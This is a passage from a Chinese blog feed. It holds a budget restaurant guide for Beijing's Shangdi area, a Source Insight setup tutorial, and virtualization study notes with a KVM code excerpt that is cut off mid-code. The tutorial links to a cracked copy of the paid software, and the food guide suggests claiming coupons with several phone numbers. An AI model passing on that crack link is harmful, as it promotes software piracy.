）：</p><ul><li><strong>无中生有：</strong> 点一个四宫格番茄锅，三个清水锅，然后<strong>用辣酱调出辣锅底料</strong>，加到清水锅中，即可得到<strong>0元辣锅底</strong>。注意这个番茄锅尽量不要下菜，它是专门用来喝汤的，番茄锅下菜之后容易变味，汤会变得不好喝</li><li><strong>无懈可击：</strong> <ul><li>喝<strong>免费的番茄牛肉汤</strong>，三碗起步</li><li>吃免费的水果，五盘起步（火龙果、西瓜等）</li></ul></li><li><strong>无所不包：</strong> 荤素搭配，牛羊肉卷半份就得三四十，毛肚更贵，没必要点一堆荤菜。<strong>面条、萝卜、豆皮涮了都挺好吃的</strong></li></ul><p>再说几点：</p><ul><li>一定要提前预定，不然真的会排很久的队。有次工作日去吃，以为不需要排队，结果大中午的排了一个多小时</li><li>经常有特价菜品，比如9.9的素菜，可以关注一下</li><li>如果你提前预定了，但是你到了之后，等了几分钟(比如他们在打扫卫生)，他们就会送你一两个免费菜品</li></ul><p><img src="https://img.gls.show/img/202311192051304.png"></p><p><img src="https://img.gls.show/img/202311192050765.png"></p><h1 id="吉野家"><a href="#吉野家" class="headerlink" title="吉野家"></a>吉野家</h1><p>美团上19.9三件套永远等着你，如果是新人，19.9的五件套也不是没吃过</p><p><img src="https://img.gls.show/img/202311192027683.png"></p><p><img src="https://img.gls.show/img/202311192028542.png"></p><p><img src="https://img.gls.show/img/202311192025391.png"></p><h1 id="老乡鸡"><a href="#老乡鸡" class="headerlink" title="老乡鸡"></a>老乡鸡</h1><p>单点真的很贵，之前在合肥读大学的时候，就觉得老乡鸡很贵，俩人来一份鸡汤上俩菜俩碗米饭就一百多了，<del>毕竟那时候还没学会正确的挂壁姿势</del></p><p>现在学会挂壁之后，美团20以内可以吃三件套</p><p><img src="https://img.gls.show/img/202311192042936.png"></p><h1 id="麦当劳"><a href="#麦当劳" class="headerlink" title="麦当劳"></a>麦当劳</h1><p>先放几个订单截图：</p><p><img src="https://img.gls.show/img/20230917212921.png"></p><p><img src="https://img.gls.show/img/202311062154692.png"></p><h2 id="如何正确薅麦当劳羊毛"><a href="#如何正确薅麦当劳羊毛" class="headerlink" title="如何正确薅麦当劳羊毛"></a><strong>如何正确薅麦当劳羊毛</strong></h2><p>1.支付宝搜索麦当劳，滑动横幅可领券，每隔几天可以白嫖一次免费餐品，比如中薯、一对鸡腿/鸡翅、中可等。<strong>如果你有多个手机号相当于可以超级加倍，直接白吃白喝。</strong> 美中不足的是每次需要任意消费才能用券</p><p><img src="https://img.gls.show/img/MergedImages.jpg"></p><p>2.麦当劳程序-》会员日-》领券。不定时会发放很多券，每次的活动都不一样，<strong>印象中比较值的是10元恩格斯牛堡/巨无霸、五元板烧等</strong></p><p>3.淘宝代订。在淘宝店拍下物品，之后他给你代下单，你提供麦当劳店铺地点即可。这个方法比较绝活的商品的是<strong>一元雪碧/冰红茶、5.8元的一对鸡翅、永远10元的板烧/香辣鸡腿堡</strong>，其余商品也会比官方app便宜一些</p><p><img src="https://img.gls.show/img/20230917221443.png"></p><h2 id="早餐"><a href="#早餐" class="headerlink" title="早餐"></a>早餐</h2><p>信工所早饭就是衣野丁真（<del>鉴定为衣驼使</del>），我每天早饭都是去麦当劳吃的<br>Tips：</p><ul><li>花11.9买一个早餐卡，早餐可以打6折</li><li>薯饼味道不错，加一元可以把薯饼换成香肠</li><li>早上如果困可以喝咖啡，不困可以喝豆浆（我也是吃了好久才发现饮料可以换）</li><li>推荐菜品<ul><li>原味板烧三件套12.6元</li><li>猪柳麦满分三件套12元</li><li>火腿扒麦三件套10.6</li><li>大脆鸡扒三件套10.6</li></ul></li><li>不推荐任何超过15元的麦当劳早餐</li></ul><h2 id="麦当劳菜品点评"><a href="#麦当劳菜品点评" class="headerlink" title="麦当劳菜品点评"></a>麦当劳菜品点评</h2><p><strong>辣翅（最近有绝活可以5.94买俩）</strong></p><p>是真的有辣味的辣翅。kfc、麦当劳、汉堡王、华莱士名叫辣翅的很多，但是只有麦麦是真正有辣味的，比较适合我这种喜欢辣味的人吃(但是还是不够辣，建议加大辣度)。</p><p>刚出锅的辣翅非常好吃，热乎、稍微有些烫口，外面裹着的面炸的脆脆的，就着肉吃下去很香</p><h2 id="汉堡"><a href="#汉堡" class="headerlink" title="汉堡"></a>汉堡</h2><p><strong>麦辣鸡腿堡</strong></p><p>外面酥脆，里面鸡肉多汁，有辣味，配合沙拉酱和生菜，口感和味道都很不错，有一些辣味</p><p><strong>板烧鸡腿堡</strong></p><p>油没有麦辣鸡腿堡那么多，口感第一流，一口咬下去松松软软非常的轻松，味道也很不错，可惜不辣</p><p><strong>双吉</strong></p><p>版本之子，性价比之王，yyds，薄纱巨无霸。汉堡内容很丰富，除了两层质量很不错的牛肉之外还有番茄酱、沙拉酱、酸黄瓜等等。<del>当年1+1只要11块钱的时候很流行买俩1+1把双吉拼起来超级加倍作为四层牛肉汉堡食用</del></p><p><strong>巨无霸/安格斯牛堡</strong></p><p>依托答辩，又贵又不好吃，三层面包夹两块牛肉，被双吉爆杀（但是有一说一牛肉质量还是不错的，和双吉差不多）</p><h1 id="李先生"><a href="#李先生" class="headerlink" title="李先生"></a>李先生</h1><p>位于上地好利来旁边（没错就是那个T字路口），人均20块钱的三件套：</p><p><img src="https://img.gls.show/img/202311192043714.png"></p><h1 id="鱼你在一起"><a href="#鱼你在一起" class="headerlink" title="鱼你在一起"></a>鱼你在一起</h1><p>人均30的外卖，米很香，外卖包装很好，鱼很好吃</p><p><img src="https://img.gls.show/img/202311192047866.png"></p><h1 id="海盗虾饭"><a href="#海盗虾饭" class="headerlink" title="海盗虾饭"></a>海盗虾饭</h1><p>人均25的外卖，味道还不错</p><p><img src="https://img.gls.show/img/202311192058672.png"></p><h1 id="萨莉亚"><a href="#萨莉亚" class="headerlink" title="萨莉亚"></a>萨莉亚</h1><blockquote><p>西餐界的沙县小吃，信工所三食堂，位于上地商场，价格实惠</p></blockquote><p>海鲜挂逼面只要14</p><p><img src="https://img.gls.show/img/202311192047685.png"></p><h1 id="达美乐披萨"><a href="#达美乐披萨" class="headerlink" title="达美乐披萨"></a>达美乐披萨</h1><blockquote><p>圣周二，圣周三，达美乐的光辉播撒人间。信工所三食堂，位于上地商场</p></blockquote><p>周二周三达美乐披萨七折，并且每次吃完达美乐都可以抽奖，最次也能抽到一个饮料，好点就是蛋挞和烤串，按照最便宜的披萨40块钱算，一顿饭28可以吃的很好</p><ul><li>只推荐周二周三去吃，富哥随意</li><li>推荐口味<ul><li>德克萨斯烤肉 27.3</li><li>经典意识肉酱 27.3</li><li>照烧牛肉披萨</li></ul></li></ul><p><img src="https://img.gls.show/img/202311192054147.png"></p><h1 id="一早一晚"><a href="#一早一晚" class="headerlink" title="一早一晚"></a>一早一晚</h1><p>麦当劳旁边的一家面馆，有早餐，有外卖，有堂食</p><p>性价比选择是16块钱的挂逼拌面，量大管饱</p><p>牛肉面（22）：<br><img src="https://img.gls.show/img/202311192052987.png"></p><h1 id="华莱士"><a href="#华莱士" class="headerlink" title="华莱士"></a>华莱士</h1><blockquote><p>外卖</p></blockquote><p><del>喷射战士</del> 可能只是玩梗，我倒是没遇到过</p><p>15块钱可以点三个主食，还是很不错的</p><h1 id="铁道边烧烤"><a href="#铁道边烧烤" class="headerlink" title="铁道边烧烤"></a>铁道边烧烤</h1><p>位于五道口，人均60+的烤肉，量大管饱味道好，128的套餐有好几份烤肉、金枪鱼拌饭、好几份素菜，根本吃不完</p><p><img src="https://img.gls.show/img/202311192109784.png">****</p><h1 id="麻六记"><a href="#麻六记" class="headerlink" title="麻六记"></a>麻六记</h1><p>位于清河万象汇五楼，适合爱吃辣的人。88一份的招牌辣锅包罗万象，包括但是不限于肥肠、鳝鱼、鸭血、小酥肉等等，够两个人吃饱了</p><p>此外，此店好评送冰粉、糖葫芦</p><p><img src="https://img.gls.show/img/202311192101705.png"></p><h1 id="潮汕牛肉火锅"><a href="#潮汕牛肉火锅" class="headerlink" title="潮汕牛肉火锅"></a>潮汕牛肉火锅</h1><p>人均一百六，富人的选择。环境一般，服务一般，但是肉确实新鲜，可以吃牛肉吃到爽</p><p><img src="https://img.gls.show/img/202311192032125.png"></p><h1 id="很久以前羊肉串"><a href="#很久以前羊肉串" class="headerlink" title="很久以前羊肉串"></a>很久以前羊肉串</h1><blockquote><p>位于上地负一楼</p></blockquote><p>人均100，属于附近最高水平的烧烤店，卫生条件和服务态度也不错<br><img src="https://img.gls.show/img/202311192045545.png"></p><p><img src="https://img.gls.show/img/202311192045284.png"></p><p><img src="https://img.gls.show/img/202311192031383.png"></p><h1 id="俄罗斯餐厅"><a href="#俄罗斯餐厅" class="headerlink" title="俄罗斯餐厅"></a>俄罗斯餐厅</h1><blockquote><p>位于中关村</p></blockquote><p>人均100+，装修还不错，但是感觉不符合中国人口味，<del>又大又粗的面包蘸番茄酱能做主食你敢信</del>。想尝鲜的可以考虑一下</p><p>![[Pasted image 20231119203905.png]]<br><img src="https://img.gls.show/img/202311192038072.png"></p><p><img src="https://img.gls.show/img/202311192037458.png"></p><h1 id="武圣羊汤"><a href="#武圣羊汤" class="headerlink" title="武圣羊汤"></a>武圣羊汤</h1><blockquote><p>分店众多，最近的一家在金隅嘉华</p></blockquote><p>人均25，羊肉汤分量足，有羊肉味（什么时候开始这个也是褒义词了qwq）</p><p><img src="https://img.gls.show/img/202311192034509.png"></p><h1 id="犟骨头"><a href="#犟骨头" class="headerlink" title="犟骨头"></a>犟骨头</h1><blockquote><p>位于金隅嘉华</p></blockquote><p>芝士金隅嘉华：</p><p><img src="https://img.gls.show/img/202311192041423.png"></p><p>人均20，送饮料，肉多的根本吃不完</p><p><img src="https://img.gls.show/img/202311192035259.png"></p><h1 id="绿茶餐厅"><a href="#绿茶餐厅" class="headerlink" title="绿茶餐厅"></a>绿茶餐厅</h1><blockquote><p>分店众多，最近的一家在上地</p></blockquote><p>人均60左右，属于南方菜系，偏清淡</p><p>推荐菜：</p><ul><li>烧鸡</li><li>冰激凌面包</li><li>米酒</li></ul><p><img src="https://img.gls.show/img/202311192112795.png"></p><p><img src="https://img.gls.show/img/202311192108740.png"></p><h1 id="嘉和一品粥"><a href="#嘉和一品粥" class="headerlink" title="嘉和一品粥"></a>嘉和一品粥</h1><blockquote><p>位于上地北、农大西</p></blockquote><h1 id="头一号"><a href="#头一号" class="headerlink" title="头一号"></a>头一号</h1><blockquote><p>分店众多，最近的一家在上地医院东</p></blockquote><h1 id="霸蛮米线"><a href="#霸蛮米线" class="headerlink" title="霸蛮米线"></a>霸蛮米线</h1><blockquote><p>位于上地负一层</p></blockquote><p>无限续粉，最高记录吃了五份。ps：这个辣椒是真的挺辣的</p><p><img src="https://img.gls.show/img/202311192040639.png"></p><p><img src="https://img.gls.show/img/202311192028404.png"></p><h1 id="东来顺"><a href="#东来顺" class="headerlink" title="东来顺"></a>东来顺</h1><blockquote><p>位于上地商场</p></blockquote><p>人均100，口味一般，纯纯的辣鸡，远远比不上海底捞。</p><h1 id="火锅鸡"><a href="#火锅鸡" class="headerlink" title="火锅鸡"></a>火锅鸡</h1><blockquote><p>分店众多，总店在怀柔</p></blockquote><p>人均70+，yyds，好吃不贵，怀柔一绝。就是太好吃了需要排队</p><h1 id="云海肴"><a href="#云海肴" class="headerlink" title="云海肴"></a>云海肴</h1><p>位于清河万象汇，人均110+</p><p>还没吃过斤价108的鱼，锅底还要另算钱，纯纯被宰了：(</p><p><img src="https://img.gls.show/img/202311192115968.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>source insight ——源码的最佳阅读器</title>
    <link href="/p/6b8fde0c/"/>
    <url>/p/6b8fde0c/</url>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul><li>在此处下载：<a href="https://www.sourceinsight.com/download/">Downloads - Source Insight</a></li><li>si正版是收费的，如果觉得贵可以考虑github上一个破解的项目：<a href="https://github.com/achilsh/source_insight_4">GitHub - achilsh/source_insight_4: 参考网上使用</a></li></ul><h1 id="配置项目"><a href="#配置项目" class="headerlink" title="配置项目"></a>配置项目</h1><p>这是主界面</p><p><img src="https://img.gls.show/img/20230815173930.png"></p><p>对于每一个源码文件夹，我们都要建立一个项目（project）</p><p>菜单-》project-》new project或者alt+shift+N快捷键可以新建项目</p><p><img src="https://img.gls.show/img/20230815174144.png"></p><p>填写项目名称，以及source insight项目文件存储位置，这里推荐将<strong>项目文件存储位置放在你的源码的文件夹的根目录</strong>（后面会讲述原因）</p><p><img src="https://img.gls.show/img/20230815174248.png"></p><p>一路OK，到达这个界面</p><p><img src="https://img.gls.show/img/20230815174556.png"></p><p>选中源码文件夹，直接add all，选中递归加入文件夹中文件</p><p>然后close即可。至此，项目已经创建完成</p><p>但是目前为止，还没有创建项目中代码的符号索引，我们需要手动sync一下，快捷键是alt+shift+s</p><p><img src="https://img.gls.show/img/20230815174814.png"></p><p>点击start，同步过程或许有些慢（由源码大小决定）</p><h1 id="配置相对路径"><a href="#配置相对路径" class="headerlink" title="配置相对路径"></a>配置相对路径</h1><p>网上相关教程都是乱七八糟，其实很简单，只需要<strong>将项目文件存储位置放在你的源码的文件夹的根目录</strong>，即可做到显示相对路径</p><h1 id="si实用功能"><a href="#si实用功能" class="headerlink" title="si实用功能"></a>si实用功能</h1><h2 id="查看定义"><a href="#查看定义" class="headerlink" title="查看定义"></a>查看定义</h2><ul><li><p>打开context Window，左侧代码窗口处点击函数名，右侧将会弹出该函数的定义</p></li><li><p>直接右键函数，选择jump to definition亦可</p></li><li><p>按住ctrl键，点击函数名亦可</p></li></ul><p><img src="https://img.gls.show/img/20230818173044.png"></p><h2 id="查看引用"><a href="#查看引用" class="headerlink" title="查看引用"></a>查看引用</h2><p>找到函数名，右键jump to reference（在弹出的窗口中可以选择是整个project搜索还是当前文件中搜索等等选项）</p><h2 id="查看函数调用"><a href="#查看函数调用" class="headerlink" title="查看函数调用"></a>查看函数调用</h2><p>找到函数名，右键jump to caller即可</p><h2 id="生成函数调用图"><a href="#生成函数调用图" class="headerlink" title="生成函数调用图"></a>生成函数调用图</h2><p>在relation的窗口的设置中，将function的relation改为calls and callers（默认是referrence），之后就可以得到函数调用图了</p><p>对于expansion level的值的设置，建议是2，太大了的话每一次构建索引会很慢，而1又太小了</p><p><img src="https://img.gls.show/img/20230818174710.png"></p><p>然后记得在call graph filtering 中把macro去掉，那个没什么必要</p><p><img src="https://img.gls.show/img/20230818175636.png"></p><h2 id="修改主题"><a href="#修改主题" class="headerlink" title="修改主题"></a>修改主题</h2><p>网上有许多主题，它们的本质是xml配置文件。菜单-》option-》load configuration可以导入预设的主题界面，推荐一个黑色模式的主题：<a href="https://github.com/Jay11212/vs_code_theme_for_source">仿vs code 主题 </a></p><p><img src="https://img.gls.show/img/20230818170640.png"></p><p>除此之外，si还有许多自带的主题，点击菜单-》option-》visual theme即可选择</p><h2 id="修改函数名大小和颜色"><a href="#修改函数名大小和颜色" class="headerlink" title="修改函数名大小和颜色"></a>修改函数名大小和颜色</h2><p>默认设置下函数是绿色的而且比较小，我习惯改成大且醒目的颜色</p><p><img src="https://img.gls.show/img/20230818180441.png"></p><h1 id="配置si阅读linux内核源码"><a href="#配置si阅读linux内核源码" class="headerlink" title="配置si阅读linux内核源码"></a>配置si阅读linux内核源码</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>《深度探索Linux系统虚拟化》学习笔记</title>
    <link href="/p/c275a99e/"/>
    <url>/p/c275a99e/</url>
    
    <content type="html"><![CDATA[<h1 id="一、CPU虚拟化"><a href="#一、CPU虚拟化" class="headerlink" title="一、CPU虚拟化"></a>一、CPU虚拟化</h1><h2 id="1-1-x86CPU虚拟化"><a href="#1-1-x86CPU虚拟化" class="headerlink" title="1.1 x86CPU虚拟化"></a>1.1 x86CPU虚拟化</h2><p>论文“Formal Requirements for Virtualizable Third GenerationArchitectures”中提出了虚拟化的3个条件：</p><ul><li><strong>等价性</strong>，即VMM需要在宿主机上为虚拟机模拟出一个本质上<strong>与物理机一致的环境</strong></li><li><strong>高效性</strong>，即虚拟机指令执行的性能与其在物理机上运行相比并<strong>无明显损耗</strong></li><li><strong>资源控制</strong>，即<strong>VMM可以完全控制系统资源</strong>。由VMM控制协调宿主机资源给各个虚拟机，而不能由虚拟机控制了宿主机的资源。</li></ul><h3 id="1-1-1陷入和模拟"><a href="#1-1-1陷入和模拟" class="headerlink" title="1.1.1陷入和模拟"></a>1.1.1陷入和模拟</h3><p>满足上述虚拟化的一个解决方案是<strong>陷入和模拟（Trap and Emulate）模型</strong></p><blockquote><p>处理器分为两种运行模式：<strong>系统模式和用户模式</strong><br>CPU的指令也分为：<strong>特权指令和非特权指令</strong><br>特权指令只能在系统模式运行，如果在用户模式运行就将触发处理器异常。内核运行在系统模式</p></blockquote><p>在陷入和模拟模型下，虚拟机的用户程序仍然运行在用户模式，但是<strong>虚拟机的内核也将运行在用户模式</strong>，这种方式称为特权级压缩（Ring Compression）。在这种方式下，虚拟机中的<strong>非特权指令直接运行在处理器上</strong>。这样的好处就是高效，指令无需vmm干预可以直接运行在处理器上</p><p>对于<strong>虚拟机中的特权指令，因为是在用户模式下运行，将触发处理器异常，从而陷入VMM</strong>中，由VMM代理虚拟机完成系统资源的访问，即所谓的模拟（emulate）</p><h3 id="1-1-2-x86架构虚拟化的障碍"><a href="#1-1-2-x86架构虚拟化的障碍" class="headerlink" title="1.1.2 x86架构虚拟化的障碍"></a>1.1.2 x86架构虚拟化的障碍</h3><p>修改系统资源的，或者在不同模式下行为有不同表现的，都属于<strong>敏感指令</strong></p><p>在虚拟化场景下，VMM需要监测这些敏感指令。<strong>一个支持虚拟化的体系架构的敏感指<br>令都应该属于特权指令</strong>，即<strong>在非特权级别执行这些敏感指令时CPU会抛出异常</strong>，进入VMM的异常处理函数，从而实现了控制VM访问敏感资源的目的</p><p><strong>x86架构并不是所有的敏感指令都是特权指令，有些敏感指令在非特权模式下执行时并不会抛出异常，此时VMM就无法拦截处理VM的行为了</strong></p><p>那么问题来了，为什么既要有敏感指令，又要有特权指令，这是出于什么考虑呢？或者说直接简单粗暴的把所有的敏感指令都归为特权指令不就可以了？</p><ol><li><strong>提高性能和效率：</strong> 敏感指令允许一些敏感操作在用户态下执行，从而提高性能和效率。在某些情况下，将敏感操作作为普通指令执行可以减少特权级别的切换和开销，提高应用程序的执行效率。</li><li><strong>灵活性和可编程性：</strong> 敏感指令允许应用程序在用户态下执行一些低级的硬件操作，以实现更灵活的编程和功能。这可以使应用程序更加自由地控制硬件，实现一些特定的功能或优化。</li></ol><p>以修改FLAGS寄存器中的IF（Interrupt Flag）为例：</p><ul><li>首先使用指令pushf将FLAGS寄存器的内容压到栈中</li><li>然后将栈顶的IF清零</li><li>最后使用popf指令从栈中恢复FLAGS寄存器<br>如果虚拟机内核没有运行在ring 0，x86的CPU并不会抛出异常，而只是忽略指令popf</li></ul><p>解决方案：试用xen的方式，修改操作系统源码（也即是半虚拟化方式）；另一种是软件层面的二进制翻译</p><p>静态翻译：</p><ul><li>运行前扫描整个可执行文件，对敏感指令进行翻译，形成一个新的文件</li><li>缺点：必须提前处理，而且对于有些指令只有在运行时才会产生的副作用，无法静态处理</li></ul><p>动态翻译：</p><ul><li>在运行时以代码块为单元动态地修改二进制代码<ul><li>在很多VMM中得到应用，而且优化的效果非常不错</li></ul></li></ul><h3 id="1-1-3vmx"><a href="#1-1-3vmx" class="headerlink" title="1.1.3vmx"></a>1.1.3vmx</h3><blockquote><p>Intel开发了VT技术以支持虚拟化，为CPU增加了Virtual-Machine<br>Extensions，简称VMX</p></blockquote><p>由于之前的软件解决方案引入了巨大开销和复杂性，于是，Intel尝试从硬件层面解决这个问题（nm英特尔终于下场了）</p><blockquote><p>控制寄存器 CR3 在 x86 架构中是页目录表的基地址，用于确定当前正在执行的虚拟机的页表。</p></blockquote><p>当使用影子页表（Shadow Page Table）进行虚拟地址（GVA）到物理地址（HPA）的映射时，**虚拟机监控器（VMM）模块需要捕获虚拟机（Guest）每一次设置控制寄存器 CR3 的操作，并将它重定向到影子页表。CR3 寄存器是x86体系结构中的控制寄存器，用于指向页表的物理地址。</p><blockquote><p>GVA（Guest Virtual Address，客户虚拟地址）和 HPA（Host Physical Address，宿主物理地址）之间的映射是指将虚拟机中的内存地址映射到底层物理主机上的内存地址</p></blockquote><p>通过捕获并重定向CR3寄存器的设置操作，VMM能够截获Guest的页表访问并更改其映射方式。<strong>VMM会创建和维护一个与Guest页表类似的影子页表，其中包含与真实物理页表相对应的影子页表项</strong>。VMM使用影子页表来追踪和管理GVA到HPA的映射，并在必要时进行转换和修改，以提供虚拟化环境的安全隔离和管理。</p><blockquote><p><strong>EPT（Extended Page Tables）：</strong> EPT 是一种硬件辅助虚拟化技术，由支持虚拟化的处理器提供。它允许虚拟机直接在物理主机上运行，而不需要额外的转换层。在启用 EPT 支持后，<strong>处理器会直接处理 GVA 到 HPA 的映射，绕过了 VMM。这意味着 <code>CR3</code> 寄存器仍然指向虚拟机的原始页表，而无需引入影子页表</strong>。<br>而当启用了硬件层面的EPT支持后，cr3寄存器不再需要指向影子页表，其仍然指向Guest的进程的页表。因此，VMM无须再捕捉Guest设置cr3寄存器的操作，也就是说，虽然写cr3寄存器是一个特权操作，但这个操作不需要陷入VMM。</p></blockquote><p>一旦启动了CPU的VMX支持，CPU将提供两种运行模式：<strong>VMX Root Mode和VMX non-Root Mode</strong>，每一种模式都支持ring 0～ring 3。VMM运行在VMX Root Mode，除了支持VMX外，VMXRoot Mode和普通的模式并无本质区别。VM运行在VMX non-Root Mode，Guest无须再采用特权级压缩方式，Guest kernel可以直接运行在VMX non-Root Mode的ring 0中<br><img src="https://img.gls.show/img/Pasted%20image%2020230801165150.png"></p><p><img src="https://img.gls.show/img/Pasted%20image%2020230801200334.png"></p><p>VM entry：</p><ul><li>处于VMX Root Mode的VMM可以通过执行CPU提供的虚拟化指令<strong>VMLaunch切换到VMX non-Root Mode</strong>，因为这个过程相当于<strong>进入Guest</strong>，所以通常也被称为<strong>VM entry</strong><br>VM exit</li><li>当Guest内部执行了敏感指令，比如某些I/O操作后，将触发CPU发生陷入的动作，从VMX non-Root Mode切换回VMX Root Mode，这个过程相当于退出VM，所以也称为VM exit</li><li>然后VMM将对Guest的操作进行模拟</li></ul><p>支持VMX的CPU有以下3点不同：</p><p>1）运行于Guest模式时，<strong>Guest用户空间的系统调用直接陷入Guest模式的内核空间</strong>，而<strong>不再是陷入Host模式的内核空间</strong>。</p><blockquote><p>系统调用处理：在VMX支持的虚拟化环境中，当Guest运行用户空间程序并进行系统调用时，系统调用不再直接陷入Host模式的内核空间，而是陷入Guest模式的内核空间。这样，<strong>Guest内核可以直接处理系统调用，而无需VMM（虚拟机监控器）介入</strong>，从而提高了性能</p></blockquote><p>2）对于外部中断，因为需要由VMM控制系统的资源，所以处于Guest模式的CPU收到外部中断后，触发CPU从Guest模式退出到Host模式，<strong>由Host内核处理外部中断。处理完中断后，再重新切入Guest模式</strong>。为了提高I/O效率，Intel支持外设<strong>透传模式</strong>，在这种模式下，Guest<strong>不必产生VM exit</strong>。在“设备虚拟化”一章将讨论这种特殊方式。</p><p>3）不再是所有的特权指令都会导致处于Guest模式的CPU发生VM exit。<strong>仅当运行敏感指令时才会导致CPU从Guest模式陷入Host模式</strong>，因为有的特权指令并不需要由VMM介入处理。</p><blockquote><p><strong>对于一些无需VMM介入的特权指令，CPU可以在Guest模式下直接执行，从而提高虚拟机的性能。</strong></p></blockquote><p>VMX（Virtual Machine Extensions）是Intel处理器的虚拟化扩展技术，它引入了VMCS（Virtual Machine Control Structure）这一数据结构。<strong>VMCS用于保存虚拟机的上下文信息，每个Guest虚拟机都有一个对应的VMCS实例。</strong></p><p>VMCS记录了虚拟机的状态和配置信息，包括虚拟处理器的寄存器值、控制寄存器设置、虚拟机执行的状态、中断处理、VM exit和VM entry的设置等。VMCS在虚拟化过程中扮演着重要的角色，用于控制虚拟机的<strong>运行</strong>、实现虚拟机的<strong>切换</strong>、以及在VM exit和VM entry时<strong>保存和恢复虚拟机的状态</strong>。</p><p>每个Guest虚拟机都有一个对应的VMCS，这些VMCS实例是独立的，彼此之间隔离。当VMM（虚拟机监控器）在宿主机上运行多个虚拟机时，每个虚拟机的VMCS会在VMM的管理下进行创建和维护。VMCS的管理涉及VM entry和VM exit的操作，用于实现Guest和宿主机之间的转换和切换。</p><p><strong>注意：每个虚拟机都会有一个唯一的 VMCS，但是每个虚拟机可以有一个或多个 vCPU</strong></p><blockquote><p>在KVM（Kernel-based Virtual Machine）模块中，对于每个虚拟CPU（VCPU），会为其创建一个VMCS（Virtual Machine Control Structure）实例。VMCS用于保存虚拟机的状态信息和控制虚拟机的行为。每个VCPU都有自己独立的VMCS，这样可以实现对不同虚拟机的隔离和管理。</p></blockquote><p><img src="https://img.gls.show/img/Pasted%20image%2020230801202743.png"><br>VMCS中主要保存着两大类数据:</p><ul><li>状态（Host的状态和Guest的状态）</li><li>行为（控制Guest运行时的行为）</li></ul><p>一些数据：</p><p>1）<strong>Guest-state</strong> area（客户机状态区域）：该区域保存着虚拟机（Guest）的状态信息。当虚拟机发生VM exit时，Guest的状态会自动保存到这个区域。当虚拟机再次进入（VM entry）时，这些保存的状态会被自动装载到CPU中，使得虚拟机能够从离开状态继续执行，这是硬件层面的自动行为，无需VMM编码干预。</p><p>2）<strong>Host-state</strong> area（宿主机状态区域）：该区域保存着宿主机（Host）的状态信息。当虚拟机发生VM entry时，CPU会自动将宿主机状态保存到这个区域。而当虚拟机发生VM exit时，CPU会自动从VMCS中恢复宿主机状态到物理CPU，使得虚拟机退出后宿主机能够继续执行。</p><p>3）VM-<strong>exit information</strong> fields（虚拟机退出信息区域）：在虚拟机发生VM exit时，VMM需要知道导致VM exit的原因，以便根据具体情况进行相应的处理。为此，CPU会自动将导致VM exit的原因和一些相关信息保存在这个区域中，供VMM使用。</p><p>4）VM-<strong>execution control</strong> fields（虚拟机执行控制区域）：该区域中的各种字段用于<strong>控制虚拟机运行时的行为</strong>。例如，可以设置是否在Guest访问CR3寄存器时触发VM exit。VM-entry control fields和VM-exit control fields也包含在这个区域中，它们用于控制虚拟机进入（VM entry）和退出（VM exit）时的行为。</p><blockquote><p>在每次准备将物理CPU<strong>切换</strong>到虚拟机的Guest模式（VM entry）时，KVM会<strong>设置物理CPU的VMCS指针，使其指向即将切换到的Guest虚拟机对应的VMCS实例</strong>。这样，当物理CPU进入Guest模式后，它会自动使用该VMCS中保存的虚拟机状态信息，并按照VMCS中的配置执行虚拟机的行为。</p></blockquote><blockquote><p>通过每个VCPU拥有自己的独立VMCS实例，并在切换到Guest模式时设置正确的VMCS指针，KVM能够高效地管理多个虚拟机，并确保虚拟机之间的隔离和资源管理。</p></blockquote><p>在创建VCPU时，KVM模块将<strong>为每个VCPU申请一个VMCS</strong>，每次CPU准备切入Guest模式时，将设置其VMCS指针<strong>指向</strong>即将切入的<strong>Guest对应的VMCS实例</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">commit <span class="hljs-number">6</span>aa8b732ca01c3d7a54e93f4d701b8aabbe60fb7<br>[PATCH] kvm: userspace interface<br>linux.git/drivers/kvm/vmx.c<br><br><span class="hljs-comment">// 定义vmx_vcpu_load函数，用于加载虚拟CPU的VMCS</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> struct kvm_vcpu *<span class="hljs-title">vmx_vcpu_load</span><span class="hljs-params">(struct kvm_vcpu *vcpu)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 将vcpu-&gt;vmcs的虚拟地址转换为物理地址，并存储在phys_addr变量中</span><br>    u64 phys_addr = __pa(vcpu-&gt;vmcs);<br>    <span class="hljs-keyword">int</span> cpu;<br>    <br>    <span class="hljs-comment">// 获取当前CPU的编号</span><br>    cpu = get_cpu();<br>    <br>    <span class="hljs-comment">// ... 其他代码 ...</span><br>    <br>    <span class="hljs-comment">// 检查当前活动的VMCS是否与将要加载的vcpu-&gt;vmcs相同</span><br>    <span class="hljs-keyword">if</span> (per_cpu(current_vmcs, cpu) != vcpu-&gt;vmcs) &#123;<br>        <span class="hljs-comment">// 设置当前活动的VMCS为vcpu-&gt;vmcs，表示正在加载该VMCS</span><br>        per_cpu(current_vmcs, cpu) = vcpu-&gt;vmcs;<br>        <br>        <span class="hljs-comment">// 执行VMCS的加载操作（VMPTRLD），将vcpu-&gt;vmcs指向的VMCS加载到CPU中</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        